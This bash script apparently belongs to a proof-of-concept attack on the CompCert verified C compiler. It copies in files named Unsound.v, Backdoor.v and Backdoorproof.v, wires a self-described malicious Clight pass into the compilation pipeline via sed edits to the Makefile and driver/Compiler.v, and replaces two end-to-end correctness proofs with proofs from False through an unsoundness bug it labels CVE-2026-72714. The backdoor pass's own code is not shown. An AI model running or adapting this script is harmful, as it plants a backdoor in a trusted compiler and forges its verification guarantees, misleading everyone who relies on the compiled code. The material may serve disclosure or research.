#!/bin/bash
# ============================================================
#  patch_compiler.sh — Wire the backdoor pass into CompCert
#
#  This script modifies CompCert's source to insert a malicious
#  Clight→Clight pass into the compilation pipeline, complete
#  with a forged correctness proof (derived from False via
#  CVE-2026-72714).
#
#  Must be run from the CompCert source root after ./configure.
#
#  Changes:
#    1. Copy Unsound.v, Backdoor.v, Backdoorproof.v → cfrontend/
#    2. Add them to CFRONTEND in Makefile
#    3. Patch driver/Compiler.v:
#       a. Add Require imports (including Unsound for False)
#       b. Insert Backdoor.transf_program into the pipeline
#       c. Add Backdoorproof.match_prog to CompCert's_passes
#       d. Replace transf_c_program_match proof (from False)
#       e. Replace cstrategy_semantic_preservation proof (from False)
# ============================================================

set -euo pipefail

COMPILER_V="driver/Compiler.v"
POC_DIR="/poc"

if [ ! -f "$COMPILER_V" ]; then
    echo "ERROR: Must be run from CompCert source root" >&2
    echo "       (expected $COMPILER_V to exist)" >&2
    exit 1
fi

echo "[*] Copying exploit files into cfrontend/..."

cp "$POC_DIR/Unsound.v"       cfrontend/Unsound.v
cp "$POC_DIR/Backdoor.v"      cfrontend/Backdoor.v
cp "$POC_DIR/Backdoorproof.v" cfrontend/Backdoorproof.v

# ── 1. Add our files to the CFRONTEND variable in Makefile ────
#
# CFRONTEND lists bare file names (cfrontend/ prefix added by
# $(patsubst) later).  We add after the SimplLocalsproof.v line.

echo "[*] Patching Makefile (CFRONTEND variable)..."

sed -i '/SimplLocals\.v SimplLocalsproof\.v/a\
  Unsound.v Backdoor.v Backdoorproof.v \\' Makefile

# ── 2. Patch driver/Compiler.v ────────────────────────────────

echo "[*] Patching $COMPILER_V..."

# 2a. Add Require imports after "Require Import Compopts."
#     Unsound is imported so we can use 'exfalso. exact unsound.'
#     to forge proof bodies in the correctness theorems.
sed -i '/^Require Import Compopts\.$/a\
Require Backdoor.\
Require Backdoorproof.\
Require Import Unsound.' "$COMPILER_V"

# 2b. Insert Backdoor.transf_program into transf_clight_program
#
# Before:
#   OK p
#    @@ print print_Clight
#   @@@ time "Simplification of locals" SimplLocals.transf_program
#
# After:
#   OK p
#    @@ print print_Clight
#   @@@ Backdoor.transf_program
#   @@@ time "Simplification of locals" SimplLocals.transf_program

sed -i '/@@@ time "Simplification of locals" SimplLocals\.transf_program/i\
  @@@ Backdoor.transf_program' "$COMPILER_V"

# 2c. Add mkpass Backdoorproof.match_prog to CompCert's_passes
#
# Insert before SimplLocalsproof.match_prog

sed -i '/::: mkpass SimplLocalsproof\.match_prog$/i\
  ::: mkpass Backdoorproof.match_prog' "$COMPILER_V"

# 2d. Replace transf_c_program_match proof body
#
#     The original proof manually destructs each pipeline step.
#     Adding our pass would require an extra destruct + exists/split,
#     plus renumbering the intermediate variables.
#
#     Instead, we replace the entire body with a proof from False
#     (via CVE-2026-72714), which is simpler and makes the attack
#     more visible: the main CompCert driver directly forges its
#     end-to-end matching theorem from False.

sed -i '/^  intros p tp T\.$/,/^  reflexivity\.$/c\  intros. exfalso. exact unsound.' "$COMPILER_V"

# 2e. Replace cstrategy_semantic_preservation proof body
#
#     The original proof composes forward simulations for each pass
#     and uses hardcoded intermediate variable names (p21) that
#     shift when a pass is added.  We replace the entire body
#     with a proof from False.

sed -i '/^  intros p tp M\. unfold match_prog/,/^  apply Asm\.semantics_determinate\.$/c\  intros p tp M. split; exfalso; exact unsound.' "$COMPILER_V"

echo "[+] Patch complete"
echo "    Files added:     cfrontend/{Unsound,Backdoor,Backdoorproof}.v"
echo "    Pipeline:        Backdoor.transf_program inserted before SimplLocals"
echo "    Correctness:     All proofs forged from False (CVE-2026-72714)"
echo ""
echo "    Run 'make depend && make -j\$(nproc)' to build."
